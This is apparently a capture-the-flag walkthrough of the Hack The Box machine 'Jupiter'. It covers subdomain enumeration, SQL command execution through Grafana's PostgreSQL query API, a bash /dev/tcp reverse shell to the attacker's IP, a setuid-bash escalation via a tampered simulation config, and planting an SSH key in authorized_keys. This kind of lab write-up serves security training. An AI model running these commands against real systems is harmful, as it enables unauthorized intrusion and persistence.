Accessing to http://10.10.11.216:80/ it redirects to http://jupiter.htb so we add the domain to the hosts file. We try to find something useful but nothing comes. With some gobuster enumeration we found the http://kiosk.jupiter.htb domain

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://jupiter.htb --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://jupiter.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: kiosk.jupiter.htb Status: 200 [Size: 34390]
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

We found the webapp Grafana v9.5.2 and googling it we don't find an obvious vulnerability, searching for something useful in the website we didn't found anything. 

Checking the requests with Burpsuite we find postresql requests

```bash
POST /api/ds/query HTTP/1.1
Host: kiosk.jupiter.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://kiosk.jupiter.htb/d/jMgFGfA4z/moons?orgId=1&refresh=1d
content-type: application/json
x-dashboard-uid: jMgFGfA4z
x-datasource-uid: YItSLg-Vz
x-grafana-org-id: 1
x-panel-id: 22
x-plugin-id: postgres
Content-Length: 391
Origin: http://kiosk.jupiter.htb
Connection: close
Cookie: redirect_to=%2Fmonitoring%3F

{
  "queries": [
    {
      "refId": "A",
      "datasource": {
        "type": "postgres",
        "uid": "YItSLg-Vz"
      },
      "rawSql": "select \n  count(parent) \nfrom \n  moons \nwhere \n  parent = 'Saturn';",
      "format": "table",
      "datasourceId": 1,
      "intervalMs": 60000,
      "maxDataPoints": 1413
    }
  ],
  "range": {
    "from": "2023-08-24T03:34:16.703Z",
    "to": "2023-08-24T09:34:16.703Z",
    "raw": {
      "from": "now-6h",
      "to": "now"
    }
  },
  "from": "1692848056703",
  "to": "1692869656703"
}
```

So lets try postgres injection (**[PostgreSQL payload Command Execution](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-command-execution)**). To use this payload we need to execute with postgres the following commands (in this order):

* <u>DROP TABLE IF EXISTS cmd_exec;</u> Drop the table you want to use if it already exists
* <u>CREATE TABLE cmd_exec(cmd_output text);</u> Create the table you want to hold the command output
* <u>COPY cmd_exec FROM PROGRAM 'id';</u> Run the system command via the COPY FROM PROGRAM function

We will change the program 'id' for a reverse shell with `bash -c "bash -i>& /dev/tcp/10.10.14.3/1234 0>&1"` (we have to escape the double quotes)

![[Pasted image 20230824115142.png]]

```bash
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.216] 54486
bash: cannot set terminal process group (2396): Inappropriate ioctl for device
bash: no job control in this shell
postgres@jupiter:/var/lib/postgresql/14/main$ whoami
whoami
postgres
```

And we have a shell, now lets escalate privileges

We don't find any user flag for the current session user so we found two users in home directory: juno and jovian

Searching for files for that users we find the following in the user juno

```bash
postgres@jupiter:/var/lib/postgresql/14/main$ find / -user juno 2>/dev/null
/dev/shm/shadow.data
/dev/shm/shadow.data/sim-stats.json
...[SNIP]...
/dev/shm/network-simulation.yml
/home/juno
```

The user juno owns this curious file called `network-simulation.yml` which is a config file and it has the following content

```yml
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/python3
      args: -m http.server 80
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/curl
      args: -s server
      start_time: 5s
```

And we can see in the server and client sections that it is executing python3 and curl binaries with some params and start time defined. Lets try to get a reverse shell for the user juno. We can copy the bash binary and give us permission to execute. To this we have to adapt the file to execute the following commands

```text
cp /bin/bash /tmp/bash
chmod u+s /tmp/bash
```

The file will look like this

```bash
general:
  # stop after 10 simulated seconds
  stop_time: 10s
  # old versions of cURL use a busy loop, so to avoid spinning in this busy
  # loop indefinitely, we add a system call latency to advance the simulated
  # time when running non-blocking system calls
  model_unblocked_syscall_latency: true

network:
  graph:
    # use a built-in network graph containing
    # a single vertex with a bandwidth of 1 Gbit
    type: 1_gbit_switch

hosts:
  # a host with the hostname 'server'
  server:
    network_node_id: 0
    processes:
    - path: /usr/bin/cp
      args: /bin/bash /tmp/bash
      start_time: 3s
  # three hosts with hostnames 'client1', 'client2', and 'client3'
  client:
    network_node_id: 0
    quantity: 3
    processes:
    - path: /usr/bin/chmod
      args: u+s /tmp/bash
      start_time: 5s
```

And now we have a bash file which we can execute

```bash
postgres@jupiter:/var/lib/postgresql/14/main$ ls -la /tmp/bash
-rwsr-xr-x 1 juno juno 1396520 Aug 27 20:06 /tmp/bash
postgres@jupiter:/var/lib/postgresql/14/main$ /tmp/bash -p
bash-5.1$ whoami
juno
bash-5.1$ ls /home/juno
shadow  shadow-simulation.sh  user.txt
bash-5.1$ cat /home/juno/user.txt
cat: /home/juno/user.txt: Permission denie
```

We still have no access to the user flag even we are the juno user

```bash
bash-5.1$ ls -la /home/juno
total 52
drwxr-x---  8 juno juno 4096 May  4 12:10 .
drwxr-xr-x  4 root root 4096 Mar  7 13:00 ..
lrwxrwxrwx  1 juno juno    9 Mar  7 10:45 .bash_history -> /dev/null
-rw-r--r--  1 juno juno  220 Jan  6  2022 .bash_logout
-rw-r--r--  1 juno juno 3792 Mar  7 10:00 .bashrc
drwx------  3 juno juno 4096 May  4 18:59 .cache
drwxrwxr-x  5 juno juno 4096 Mar  7 10:02 .cargo
drwxrwxr-x  5 juno juno 4096 Mar  7 12:08 .local
-rw-r--r--  1 juno juno  828 Mar  7 10:00 .profile
drwxrwxr-x  6 juno juno 4096 Mar  7 10:01 .rustup
drwxrwxr-x 12 juno juno 4096 Mar  9 10:31 shadow
-rwxrwxr-x  1 juno juno  174 Apr 14 14:28 shadow-simulation.sh
drwx------  2 juno juno 4096 Mar  7 09:55 .ssh
-rw-r-----  1 root juno   33 Aug 28 15:19 user.txt
bash-5.1$ ls -la /home/juno/.ssh
total 12
drwx------ 2 juno juno     4096 Aug 28 15:49 .
drwxr-x--- 8 juno juno     4096 May  4 12:10 ..
-rw------- 1 juno postgres  563 Aug 28 15:47 authorized_keys
```

We have access to the authorize_keys file (SSH authorized public key), so lets generate a public key and change the file

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Jupiter-10.10.11.216]
└─$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:3N3D7AaVxrZWk0XhgKMKFt2jGhnc3U6sm9/dyhxWmrg kali@kali
The key randomart image is:
+---[RSA 3072]----+
|    . o o o .. o+|
|     + o + * .o.o|
|      + . * . *+.|
|     = o + o B o.|
|    . + S + o B .|
|     . . o   = = |
|          . o O .|
|           . B o.|
|            E +. |
+----[SHA256]-----+
┌──(kali㉿kali)-[~/Documents/Boxes/Jupiter-10.10.11.216]
└─$ cd ~/.ssh                               
┌──(kali㉿kali)-[~/.ssh]
└─$ ls
id_rsa  id_rsa.pub  known_hosts  known_hosts.old
┌──(kali㉿kali)-[~/.ssh]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.216 - - [28/Aug/2023 17:49:00] "GET /id_rsa.pub HTTP/1.1" 200 -

----------------

bash-5.1$ wget http://10.10.14.12/id_rsa.pub
--2023-08-28 15:48:59--  http://10.10.14.12/id_rsa.pub
Connecting to 10.10.14.12:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 563 [application/vnd.exstream-package]
Saving to: ‘id_rsa.pub’

id_rsa.pub          100%[===================>]     563  --.-KB/s    in 0s      

2023-08-28 15:49:00 (37.7 MB/s) - ‘id_rsa.pub’ saved [563/563]

bash-5.1$ ls
id_rsa.pub
bash-5.1$ mv id_rsa.pub authorized_keys
```

So now we can log in as juno user with SSH